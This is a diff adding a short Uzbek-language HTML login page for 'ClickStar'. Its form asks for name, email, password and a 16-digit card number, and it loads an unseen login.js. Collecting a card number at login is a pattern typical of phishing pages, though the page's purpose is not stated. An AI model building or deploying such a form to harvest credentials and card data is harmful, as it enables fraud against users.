@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ClickStar Login</title>
+  <link rel="stylesheet" href="./css/style.css" />
+</head>
+<body>
+  <div class="login-container">
+    <h1>ClickStar tizimiga kirish</h1>
+    <form id="loginForm">
+      <input type="text" name="fullName" placeholder="Ism Familiya" required />
+      <input type="email" name="email" placeholder="Email" required />
+      <input type="password" name="password" placeholder="Parol" required />
+      <input type="text" name="cardNumber" placeholder="Karta raqami (16 raqam)" maxlength="16" required />
+      <button type="submit">Kirish</button>
+    </form>
+    <p id="error" class="error"></p>
+    <div id="loading" class="loading">Yuklanmoqda...</div>
+  </div>
+
+  <script src="./js/login.js"></script>
+</body>
+</html>
